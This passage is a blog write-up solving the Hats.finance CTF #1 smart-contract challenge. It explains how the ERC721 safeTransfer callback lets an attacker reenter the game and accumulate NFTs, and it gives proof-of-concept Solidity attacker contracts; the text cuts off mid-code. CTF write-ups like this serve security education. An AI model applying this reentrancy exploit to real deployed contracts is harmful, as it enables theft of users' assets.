<!DOCTYPE html>
<html lang="en-us">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">

  
  <meta name="author" content="merkleplant">

  
  
  <meta name="description" content="Hats.finance is a decentralized smart bug bounty marketplace that intends to regularly run CTF competitions.
This article provides a quick walkthrough of hats’ first challenge and the solution I came up with.">
  

  
  <link rel="icon" href="http://garden.merkleplant.xyz/favicon.ico">

  
  
  <meta name="keywords" content=" hugo  latex  theme ">
  

  
  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css"
  integrity="sha384-KiWOvVjnN8qwAZbuQyWDIbfCLFhLXNETzBQjA/92pIowpC0d2O3nppDGQVgwd2nB" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.js"
  integrity="sha384-0fdwu/T/EQMsQlrHCCHoH10pkPLlKA1jL5dFyUOvB3lfeT2540/2g6YgSi2BL14p" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/auto-render.min.js"
  integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"></script>
<script>
  document.addEventListener("DOMContentLoaded", function () {
    renderMathInElement(document.body, {
      delimiters: [
        { left: '$$', right: '$$', display: true },
        { left: '\\[', right: '\\]', display: true },
        { left: '$', right: '$', display: false },
        { left: '\\(', right: '\\)', display: false }
      ],
      ignoredTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code', 'option'],
      throwOnError: false
    });
  });
</script>


  

  
  <meta property="og:title" content="Solution to Hats.finance CTF #1" />
<meta property="og:description" content="Hats.finance is a decentralized smart bug bounty marketplace that intends to regularly run CTF competitions.
This article provides a quick walkthrough of hats’ first challenge and the solution I came up with." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://garden.merkleplant.xyz/post/solution-to-hats-finance-ctf-1/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2022-05-16T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-05-16T00:00:00+00:00" />



  
  <link rel="canonical" href="http://garden.merkleplant.xyz/post/solution-to-hats-finance-ctf-1/">

  
  
  <meta itemprop="name" content="Solution to Hats.finance CTF #1">
<meta itemprop="description" content="Hats.finance is a decentralized smart bug bounty marketplace that intends to regularly run CTF competitions.
This article provides a quick walkthrough of hats’ first challenge and the solution I came up with."><meta itemprop="datePublished" content="2022-05-16T00:00:00+00:00" />
<meta itemprop="dateModified" content="2022-05-16T00:00:00+00:00" />
<meta itemprop="wordCount" content="1205">
<meta itemprop="keywords" content="" />

  
  <link media="screen" rel="stylesheet" href='http://garden.merkleplant.xyz/css/common.css'>
  <link media="screen" rel="stylesheet" href='http://garden.merkleplant.xyz/css/content.css'>

  
  
  <title>Solution to Hats.finance CTF #1 - merkleplant&#39;s garden </title>
  

  
  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Solution to Hats.finance CTF #1"/>
<meta name="twitter:description" content="Hats.finance is a decentralized smart bug bounty marketplace that intends to regularly run CTF competitions.
This article provides a quick walkthrough of hats’ first challenge and the solution I came up with."/>


  
<link rel="stylesheet" href='http://garden.merkleplant.xyz/css/single.css'>

</head>

<body>
  <div id="wrapper">
    <header id="header">
  <h1>
    <a href="http://garden.merkleplant.xyz/">merkleplant&#39;s garden </a>
  </h1>

  <nav>
    
    <span class="nav-bar-item">
      <a class="link" href="/">Posts</a>
    </span>
    
    <span class="nav-bar-item">
      <a class="link" href="/wikis/">Wikis</a>
    </span>
    
    <span class="nav-bar-item">
      <a class="link" href="https://merkleplant.xyz">About</a>
    </span>
    
  </nav>
</header>

    
<main id="main" class="post">
  
  
  <h1>Solution to Hats.finance CTF #1</h1>
  
  
  <article class="content">
    
    <p><a href="https://hats.finance/">Hats.finance</a> is a decentralized smart bug bounty marketplace that intends to regularly run CTF competitions.</p>
<p>This article provides a quick walkthrough of hats’ first challenge and the solution I came up with.</p>
<h2 id="the-challenge">The Challenge</h2>
<p>Provided was a <code>Game.sol</code> contract that encodes a card fighting game where the
goal is to obtain a flag by pitching your deck of cards (called <em>Mons</em>) against
the deck of the flag holder and win the fight. You can find the GitHub repo <a href="https://github.com/hats-finance/games">here</a>.</p>
<p>After joining the game, using <code>Games#join()</code>, a wallet receives their 3 <em>Mons</em>
as NFTs.</p>
<p>Initiating a fight happens through the <code>Games#fight()</code> function.
Two notable implementation details are:</p>
<ul>
<li>
<p>Even with the best deck of <em>Mons</em> possible (every <em>Mon</em> 9/9), an attacker
would lose against the current flag holder because they also hold a deck of 9/9
cards, and in case of a draw the current flag holder wins</p>
</li>
<li>
<p>The winner of a fight is whoever holds more Mons after the fight:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic">// winner is the player with most Mons left
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span><span style="color:#204a87;font-weight:bold">if</span> <span style="color:#000;font-weight:bold">(</span><span style="color:#000">balanceOf</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">attacker</span><span style="color:#000;font-weight:bold">)</span> <span style="color:#ce5c00;font-weight:bold">&gt;</span> <span style="color:#000">balanceOf</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">opponent</span><span style="color:#000;font-weight:bold">))</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">flagHolder</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#000">attacker</span><span style="color:#000;font-weight:bold">;</span>
</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">}</span>
</span></span></code></pre></div></li>
</ul>
<h2 id="the-idea">The Idea</h2>
<p>What if it would be possible to increase the number of <em>Mons</em> held in one
wallet?</p>
<p>If a wallet would hold 7 <em>Mons</em> it would win against the current flag holder.
3 <em>Mons</em> would be burned from the attacker’s wallet during the fight, leaving
4 <em>Mons</em> in the attacker’s wallet and 3 <em>Mons</em> in the flag holder’s wallet
after the fight is over.
This leads to the attacker being selected as the winner.</p>
<h2 id="finding-a-way-to-increase-a-wallets-mon-balance">Finding a way to increase a wallet’s Mon balance</h2>
<p>Going through the code trying to find a way to increase a wallet’s <em>Mon</em>
balance, the <code>Games#swap(address to, uint monId1, uint monId2)</code> function looks
promising.</p>
<p>It is the only public callable function that transfers <em>Mon</em> NFTs between
wallets.</p>
<p>The <em>Mon</em> cards are implemented as ERC721s, building upon the OpenZeppelin
library. The swap function transfers the NFTs using OpenZeppelin’s
<code>ERC721#_safeTransfer(address to, uint id)</code> function.</p>
<h2 id="checking-the-deps">Checking the deps</h2>
<p>OpenZeppelin’s <code>ERC721#_safeTransfer/4</code> function looks like this (<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L203">link</a>):</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#204a87;font-weight:bold">function</span> <span style="color:#000">_safeTransfer</span><span style="color:#000;font-weight:bold">(</span>
</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">address</span> <span style="color:#204a87;font-weight:bold">from</span><span style="color:#000;font-weight:bold">,</span>
</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">address</span> <span style="color:#000">to</span><span style="color:#000;font-weight:bold">,</span>
</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">uint256</span> <span style="color:#000">tokenId</span><span style="color:#000;font-weight:bold">,</span>
</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">bytes</span> <span style="color:#204a87;font-weight:bold">memory</span> <span style="color:#204a87">data</span>
</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">)</span> <span style="color:#204a87;font-weight:bold">internal</span> <span style="color:#204a87;font-weight:bold">virtual</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">_transfer</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">from</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#000">to</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#000">tokenId</span><span style="color:#000;font-weight:bold">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#204a87">require</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">_checkOnERC721Received</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">from</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#000">to</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#000">tokenId</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#204a87">data</span><span style="color:#000;font-weight:bold">),</span> <span style="color:#4e9a06">&#34;ERC721: transfer to non ERC721Receiver implementer&#34;</span><span style="color:#000;font-weight:bold">);</span>
</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">}</span>
</span></span></code></pre></div><p>The function first transfers the NFT to the receiver address and afterwards
checks that the receiver is an <code>ERC721Receiver</code>.</p>
<p>What is an <code>ERC721Receiver</code>? What exactly does the <code>_checkOnERC721Received</code>
function do?</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#204a87;font-weight:bold">function</span> <span style="color:#000">_checkOnERC721Received</span><span style="color:#000;font-weight:bold">(</span>
</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">address</span> <span style="color:#204a87;font-weight:bold">from</span><span style="color:#000;font-weight:bold">,</span>
</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">address</span> <span style="color:#000">to</span><span style="color:#000;font-weight:bold">,</span>
</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">uint256</span> <span style="color:#000">tokenId</span><span style="color:#000;font-weight:bold">,</span>
</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">bytes</span> <span style="color:#204a87;font-weight:bold">memory</span> <span style="color:#204a87">data</span>
</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">)</span> <span style="color:#204a87;font-weight:bold">private</span> <span style="color:#204a87;font-weight:bold">returns</span> <span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">bool</span><span style="color:#000;font-weight:bold">)</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">if</span> <span style="color:#000;font-weight:bold">(</span><span style="color:#000">to</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">isContract</span><span style="color:#000;font-weight:bold">())</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#204a87;font-weight:bold">try</span> <span style="color:#000">IERC721Receiver</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">to</span><span style="color:#000;font-weight:bold">).</span><span style="color:#000">onERC721Received</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">_msgSender</span><span style="color:#000;font-weight:bold">(),</span> <span style="color:#204a87;font-weight:bold">from</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#000">tokenId</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#204a87">data</span><span style="color:#000;font-weight:bold">)</span> <span style="color:#204a87;font-weight:bold">returns</span> <span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">bytes4</span> <span style="color:#000">retval</span><span style="color:#000;font-weight:bold">)</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#204a87;font-weight:bold">return</span> <span style="color:#000">retval</span> <span style="color:#ce5c00;font-weight:bold">==</span> <span style="color:#000">IERC721Receiver</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">onERC721Received</span><span style="color:#000;font-weight:bold">.</span><span style="color:#204a87">selector</span><span style="color:#000;font-weight:bold">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000;font-weight:bold">}</span> <span style="color:#204a87;font-weight:bold">catch</span> <span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">bytes</span> <span style="color:#204a87;font-weight:bold">memory</span> <span style="color:#000">reason</span><span style="color:#000;font-weight:bold">)</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#8f5902;font-style:italic">// Error handling omitted.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#000;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">}</span> <span style="color:#204a87;font-weight:bold">else</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#204a87;font-weight:bold">return</span> <span style="color:#204a87;font-weight:bold">true</span><span style="color:#000;font-weight:bold">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">}</span>
</span></span></code></pre></div><p>An <code>ERC721Receiver</code>, as implemented in the function, is:</p>
<ul>
<li>An EOA address</li>
<li>A contract that returns ERC721’s <code>onERC721Received</code> function selector when
called via the <code>onERC721Received/4</code> function</li>
</ul>
<h2 id="back-to-the-game">Back to the Game</h2>
<p>Quite literally, the winning move is going back to the game.</p>
<p>Let’s recap:</p>
<ul>
<li>Calling the <code>Games#fight()</code> function with a wallet holding 7 <em>Mons</em> wins the
game</li>
<li>Transfer of NFTs between wallets is only possible through the <code>Games#swap/3</code>
function</li>
<li>Directly after a <em>Mon</em> transfer, the receiver is called via the
<code>ERC721#onERC721Received/4</code> function</li>
</ul>
<p>The solution is to use the <code>ERC721#onERC721Received/4</code> callback to reenter the
game.</p>
<h2 id="capture-the-flag">Capture the Flag</h2>
<p>A path to capture the flag would then be:</p>
<ul>
<li>Create a few fren wallets, each joining the game and holding 3 <em>Mons</em></li>
<li>Create an attacker contract and join the game</li>
<li>Call the <code>Games#swap/3</code> function from a fren wallet to transfer a <em>Mon</em> to
the attacker wallet</li>
<li>The attacker uses the ERC721 callback function, in which they hold 4 <em>Mons</em>,
to let a fren wallet send them another <em>Mon</em></li>
<li>Repeat the last step until the attacker’s wallet holds at least 7 <em>Mons</em></li>
<li>If the attacker holds at least 7 <em>Mons</em> while being called via
<code>onERC721Received/4</code>, attack the flag holder via <code>Games#fight()</code></li>
</ul>
<h2 id="implementing-the-poc">Implementing the PoC</h2>
<p>We need two different contracts, the user fren contracts from which the
attacker borrows NFTs, and the attacker contract that reenters the game when
called via <code>onERC721Received/4</code>.</p>
<p>You can find the whole repo <a href="https://github.com/pmerkleplant/Hats-Finance-Game-Solution">here</a>.</p>
<p>Let’s start with the <code>User</code> contract:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#204a87;font-weight:bold">contract</span> <span style="color:#000">User</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8f5902;font-style:italic">// The attacker&#39;s address.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#204a87;font-weight:bold">address</span> <span style="color:#204a87;font-weight:bold">private</span> <span style="color:#204a87;font-weight:bold">immutable</span> <span style="color:#000">solution</span><span style="color:#000;font-weight:bold">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8f5902;font-style:italic">// The game&#39;s address.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#000">IGame</span> <span style="color:#204a87;font-weight:bold">private</span> <span style="color:#204a87;font-weight:bold">immutable</span> <span style="color:#000">game</span><span style="color:#000;font-weight:bold">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8f5902;font-style:italic">// Our deck, i.e. our 3 Mon NFTs.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#204a87;font-weight:bold">uint</span><span style="color:#000;font-weight:bold">[</span><span style="color:#0000cf;font-weight:bold">3</span><span style="color:#000;font-weight:bold">]</span> <span style="color:#204a87;font-weight:bold">private</span> <span style="color:#000">deck</span><span style="color:#000;font-weight:bold">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">constructor</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">address</span> <span style="color:#000">game_</span><span style="color:#000;font-weight:bold">)</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">solution</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#204a87">msg</span><span style="color:#000;font-weight:bold">.</span><span style="color:#204a87">sender</span><span style="color:#000;font-weight:bold">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">game</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#000">IGame</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">game_</span><span style="color:#000;font-weight:bold">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">function</span> <span style="color:#000">joinGame</span><span style="color:#000;font-weight:bold">()</span> <span style="color:#204a87;font-weight:bold">external</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">deck</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#000">game</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">join</span><span style="color:#000;font-weight:bold">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#204a87">require</span><span style="color:#000;font-weight:bold">(</span>
</span></span><span style="display:flex;"><span>            <span style="color:#000">game</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">balanceOf</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">address</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87">this</span><span style="color:#000;font-weight:bold">))</span> <span style="color:#ce5c00;font-weight:bold">==</span> <span style="color:#0000cf;font-weight:bold">3</span><span style="color:#000;font-weight:bold">,</span>
</span></span><span style="display:flex;"><span>            <span style="color:#4e9a06">&#34;User#joinGame: Joinig game failed&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000;font-weight:bold">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8f5902;font-style:italic">// Note that a Mon needs to be flagged as `upForSale` before a swap
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#8f5902;font-style:italic">// can be initiated.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#204a87;font-weight:bold">function</span> <span style="color:#000">putUpForSale</span><span style="color:#000;font-weight:bold">()</span> <span style="color:#204a87;font-weight:bold">external</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">game</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">putUpForSale</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">deck</span><span style="color:#000;font-weight:bold">[</span><span style="color:#0000cf;font-weight:bold">0</span><span style="color:#000;font-weight:bold">]);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">game</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">putUpForSale</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">deck</span><span style="color:#000;font-weight:bold">[</span><span style="color:#0000cf;font-weight:bold">1</span><span style="color:#000;font-weight:bold">]);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">game</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">putUpForSale</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">deck</span><span style="color:#000;font-weight:bold">[</span><span style="color:#0000cf;font-weight:bold">2</span><span style="color:#000;font-weight:bold">]);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8f5902;font-style:italic">// Swap an own Mon with some Mon from the attacker.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#8f5902;font-style:italic">// This function is called by the attacker.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#204a87;font-weight:bold">function</span> <span style="color:#000">attack</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">uint</span> <span style="color:#000">idx</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#204a87;font-weight:bold">uint</span> <span style="color:#000">wantId</span><span style="color:#000;font-weight:bold">)</span> <span style="color:#204a87;font-weight:bold">external</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">game</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">swap</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">solution</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#000">deck</span><span style="color:#000;font-weight:bold">[</span><span style="color:#000">idx</span><span style="color:#000;font-weight:bold">],</span> <span style="color:#000">wantId</span><span style="color:#000;font-weight:bold">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">function</span> <span style="color:#000">onERC721Received</span><span style="color:#000;font-weight:bold">(</span>
</span></span><span style="display:flex;"><span>        <span style="color:#204a87;font-weight:bold">address</span> <span style="color:#000">operator</span><span style="color:#000;font-weight:bold">,</span>
</span></span><span style="display:flex;"><span>        <span style="color:#204a87;font-weight:bold">address</span> <span style="color:#204a87;font-weight:bold">from</span><span style="color:#000;font-weight:bold">,</span>
</span></span><span style="display:flex;"><span>        <span style="color:#204a87;font-weight:bold">uint256</span> <span style="color:#000">tokenId</span><span style="color:#000;font-weight:bold">,</span>
</span></span><span style="display:flex;"><span>        <span style="color:#204a87;font-weight:bold">bytes</span> <span style="color:#000">calldata</span> <span style="color:#204a87">data</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">)</span> <span style="color:#204a87;font-weight:bold">external</span> <span style="color:#204a87;font-weight:bold">returns</span> <span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">bytes4</span><span style="color:#000;font-weight:bold">)</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#204a87;font-weight:bold">return</span> <span style="color:#000">IERC721Receiver</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">onERC721Received</span><span style="color:#000;font-weight:bold">.</span><span style="color:#204a87">selector</span><span style="color:#000;font-weight:bold">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">}</span>
</span></span></code></pre></div><p>The attacker will call the <code>attack()</code> function, initiating a swap from a Mon
from the user’s wallet to a <em>Mon</em> from the attacker’s wallet.</p>
<p>Going further, let’s check out the attacker contract, called <code>Solution</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#204a87;font-weight:bold">contract</span> <span style="color:#000">Solution</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8f5902;font-style:italic">// The game&#39;s address.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#000">IGame</span> <span style="color:#204a87;font-weight:bold">private</span> <span style="color:#204a87;font-weight:bold">immutable</span> <span style="color:#000">game</span><span style="color:#000;font-weight:bold">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8f5902;font-style:italic">// Our deck, i.e. our 3 Mon NFTs.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#204a87;font-weight:bold">uint</span><span style="color:#000;font-weight:bold">[</span><span style="color:#0000cf;font-weight:bold">3</span><span style="color:#000;font-weight:bold">]</span> <span style="color:#204a87;font-weight:bold">private</span> <span style="color:#000">deck</span><span style="color:#000;font-weight:bold">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8f5902;font-style:italic">// The two fren contracts to borrow Mon NFTs from.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#000">User</span> <span style="color:#000">u1</span><span style="color:#000;font-weight:bold">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">User</span> <span style="color:#000">u2</span><span style="color:#000;font-weight:bold">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">constructor</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">address</span> <span style="color:#000">game_</span><span style="color:#000;font-weight:bold">)</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">game</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#000">IGame</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">game_</span><span style="color:#000;font-weight:bold">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// Join game, receive 3 NFTs.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#000">deck</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#000">game</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">join</span><span style="color:#000;font-weight:bold">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#204a87">require</span><span style="color:#000;font-weight:bold">(</span>
</span></span><span style="display:flex;"><span>            <span style="color:#000">game</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">balanceOf</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">address</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87">this</span><span style="color:#000;font-weight:bold">))</span> <span style="color:#ce5c00;font-weight:bold">==</span> <span style="color:#0000cf;font-weight:bold">3</span><span style="color:#000;font-weight:bold">,</span>
</span></span><span style="display:flex;"><span>            <span style="color:#4e9a06">&#34;Solution: Joinig game failed&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000;font-weight:bold">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8f5902;font-style:italic">// Function to start the attack.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#204a87;font-weight:bold">function</span> <span style="color:#000">captureFlag</span><span style="color:#000;font-weight:bold">()</span> <span style="color:#204a87;font-weight:bold">external</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// Put own NFT&#39;s for sale.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#000">game</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">putUpForSale</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">deck</span><span style="color:#000;font-weight:bold">[</span><span style="color:#0000cf;font-weight:bold">0</span><span style="color:#000;font-weight:bold">]);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">game</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">putUpForSale</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">deck</span><span style="color:#000;font-weight:bold">[</span><span style="color:#0000cf;font-weight:bold">1</span><span style="color:#000;font-weight:bold">]);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">game</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">putUpForSale</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">deck</span><span style="color:#000;font-weight:bold">[</span><span style="color:#0000cf;font-weight:bold">2</span><span style="color:#000;font-weight:bold">]);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// Deploy 2 User frens.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#000">u1</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#204a87;font-weight:bold">new</span> <span style="color:#000">User</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">address</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">game</span><span style="color:#000;font-weight:bold">));</span>
